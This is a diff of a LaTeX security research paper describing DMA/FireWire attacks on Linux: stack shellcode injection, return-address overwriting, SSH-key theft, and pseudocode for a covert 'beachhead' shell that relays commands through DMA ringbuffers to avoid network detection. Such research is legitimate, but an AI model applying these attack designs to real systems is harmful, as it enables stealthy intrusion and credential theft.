@@ -450,10 +450,10 @@ developed; e.g.  \cite{phrack59.8:2002} gives an introduction into using
 
 \subsubsection{Overwriting the stack and return addresses}
 
-\label{overwriting_stack} I have put most of my efforts into injecting code into
-the stack and overwriting return-addresses on the stack to point to the injected
-code. This modification of the classic \emph{stack overflow} method has some
-advantages over the previous approach:
+\label{overwriting_stack} Besides stealing SSH-keys, I have put most of my
+efforts into injecting code into the stack and overwriting return-addresses on
+the stack to point to the injected code. This modification of the classic
+\emph{stack overflow} method has some advantages over the previous approach:
 
 \begin{itemize}
 
@@ -465,12 +465,13 @@ advantages over the previous approach:
 		processes using the glibc or \emph{all} instances of $/bin/sh$.
 
 	\item The process can read and write to the stack as well, thus we can
-		communicate with the injected shell-code in a rather easy way.
+		communicate with the injected shell-code in a rather easy way
+		(see \ref{communication_DMA}).
 
 	\item During the attack we do not need to modify parts of the code of
-		the target-process, reducing the risc of an astray process. The
+		the target-process, reducing the risk of an astray process. The
 		final part consists of overwriting 4 byte wide return-addresses
-		on the stack and this can be done atomically almost always.
+		on the stack and this can almost always be done automatically.
 
 \end{itemize}
 
@@ -491,7 +492,7 @@ The attack consists of the following steps:
 		32-bit aligned 32-bit values that contain a value that might be
 		a pointer into the main code area (\texttt{0x08**~****}, see
 		figure \ref{fig:linux_virtual_address_space}) with a pointer to
-		the injected code.  A more agressive approach might also
+		the injected code.  A more aggressive approach might also
 		overwrite return-values pointing into the library section
 		(\texttt{0xB7**~****}).
 
@@ -510,15 +511,16 @@ bindshell and a simple printf can be found in
 
 \subsubsection{Direct communication with shellcode via DMA}
 
-The masterpiece of shellcode-writing is a shellcode that spawns an interactive
-shell and yet is as invisible on the target system as possible. An interactive
-shell has to communicate with its user, thus typically a network-based bindshell
-is used for this attack. The downside is the visibility of the communication on
-the network-layer: an administrator can easily spot the network connection by
-either sniffing on the network or by asking the system what kind of sockets and
-files a process is using\footnote{e.g. by using \texttt{lsof -i} (LiSt Open
-Files)}. A network intrusion system (NIS) can easily spot bindshell connections
-in an automated way or firewalls could be configured in a way that a network
+\label{communication_DMA} The masterpiece of shellcode-writing is a shellcode
+that spawns an interactive shell (thus the name ``shellcode'') and yet is as
+invisible on the target system as possible.  An interactive shell has to
+communicate with its user, so typically a network-based bindshell is used for
+this attack. The downside is the visibility of the communication on the
+network-layer: an administrator can easily spot the network connection by either
+sniffing on the network or by asking the system what kind of sockets and files a
+process is using\footnote{e.g. by using \texttt{lsof -i} (LiSt Open Files)}. A
+network intrusion system (NIS) can easily spot bindshell connections in an
+automated way or firewalls could be configured in a way that a network
 connection is impossible. When using e.g. firewire to attack a host it is even
 possible that there is no network connection between the attacker and the victim
 at all.
@@ -529,9 +531,22 @@ special media for his attack, he can also use this media for communicating with
 his injected ``beachhead'', does he not?
 
 So as we use DMA to inject shellcode, we can use DMA to communicate with the
-shellcode. The schema of the beachhead is introduced in figure
-\ref{fig:schema_beachhead}, the overall functionality in figure
-\ref{fig:functionality_beachhead}.
+shellcode. The overall mechanism is introduced in figure
+\ref{fig:functionality_beachhead}. The injected shellcode will fork a shell and
+communicate with stdin/stdout of the shell via two pipes. The shellcode then
+creates a second thread, then having one thread for each direction of
+\emph{master to shell} and \emph{shell to master}. If the master wishes to send
+a command to the shell, it writes the command string into the \emph{FromMaster}
+ringbuffer via DMA.  Once the ReaderThread sees that the ringbuffer is not
+empty, it reads the data inside the buffer and writes it into the pipe to the
+shell.  The WriterThread will read data coming from the shell from the pipe and
+then write it into the \emph{ToMaster} ringbuffer, so the master can read it via
+DMA.
+
+The shellcode of the beachhead
+(\texttt{attacks/userspace/shellcodes/dmashellcode.s}) is introduced in figure
+\ref{fig:beachhead_pseudocode} in pseudo-code. The program to inject the
+shellcode and communicate with it is \texttt{attacks/userspace/dmashell.c}.
 
 \begin{figure}[ht] \begin{center}
 
@@ -547,16 +562,114 @@ shellcode. The schema of the beachhead is introduced in figure
 
 
 \begin{figure}[ht] \begin{center}
+	\tiny
+	\begin{lstlisting}
+		// ringbuffer for data from beachhead to master
+		RingBuffer	ToMaster;
+		// ringbuffer for data from master to beachhead
+		RingBuffer	FromMaster;
 
-%	\epsfysize 15cm
+		// pipe for data from beachhead to shell
+		int		ToShell[2];
+		// pipe for data from shell to beachhead
+		int		FromShell[2];
+		// flag, if pipes are still valid (volatile because two threads access it)
+		volatile bool	pipes_ok = 1;
 
-	\epsffile{schema_beachhead.eps}
+		int		child_pid;
+		// set by master if child should be killed
+		volatile bool	terminate_child = 0;
+		// set by beachhead to signal death of child
+		bool		child_is_dead = 0;
+		// set by master to acknowledge death of child
+		volatile bool	child_is_dead_ACK = 0;
 
-	\caption{Schema of the beachhead}
+		start:
+			pipe(ToShell[]);
+			pipe(FromShell[]);
+			switch fork() {
+				case child:
+					dup2(ToShell[0], stdin);
+					dup2(FromShell[1], stdout);
+					dup2(FromShell[1], stderr);
+					execve("/bin/sh");
+					// on failure: exit.
+					exit();
+					;;
+				case parent:
+					child_pid = returnvalue of fork;
+					close(ToShell[0]);
+					close(FromShell[1]);
+					// create a second thread "writerThread"
+					clone(writerThread);
+					// current thread becomes "readerThread"
+					goto readerThread;
+					;;
+			}
 
-	\label{fig:schema_beachhead}
 
-\end{center}\end{figure}
+		readerThread:
+			// the readerThread will read from the master and relay to the shell
+			while( pipes_ok ) {
+				if(terminate_child) {
+					// attacker requested shell to be terminated
+					kill(child_pid, SIGKILL);
+					pipes_ok = 0;
+					// readerThread terminates, writerThread will do cleanup
+					exit();
+				}
+				if( isEmpty(FromMaster) ) {
+					sleep(0.001 seconds);
+				} else {
+					if(1 != write(ToShell[1], FromMaster.buffer
+							+FromMaster.currentLocation, 1 byte)) {
+						// can not communicate with child
+						pipes_ok = 0;
+					} else
+						FromMaster.currentLocation += 1;
+				}
+			}
+			exit();
+
+		writerThread:
+			// the writerThread will read from the shell and relay to the master
+			while( pipes_ok ) {
+				if( isFull(ToMaster) ) {
+					sleep(0.001 seconds);
+				} else {
+					if(1 != read(FromShell[0], ToMaster.buffer
+							+ToMaster.currentLocation, 1 byte)) {
+						// can not communicate with child
+						pipes_ok = 0;
+					} else
+						ToMaster.currentLocation += 1;
+				}
+			}
+			// pipes are closed. tell the master, but wait at most 2 seconds
+			while(!chils_is_dead_ACK && child_is_dead <= 2) {
+				child_is_dead++;
+				sleep(1 second);
+			}
+			exit();
+			
+
+	\end{lstlisting}
+	\caption{Beachhead shellcode, pseudocode}
+	\label{fig:beachhead_pseudocode}
+\end{center} \end{figure}
+
+
+%\begin{figure}[ht] \begin{center}
+%
+%%	\epsfysize 15cm
+%
+%	\epsffile{schema_beachhead.eps}
+%
+%	\caption{Schema of the beachhead}
+%
+%	\label{fig:schema_beachhead}
+%
+%\end{center}\end{figure}
 
 
 
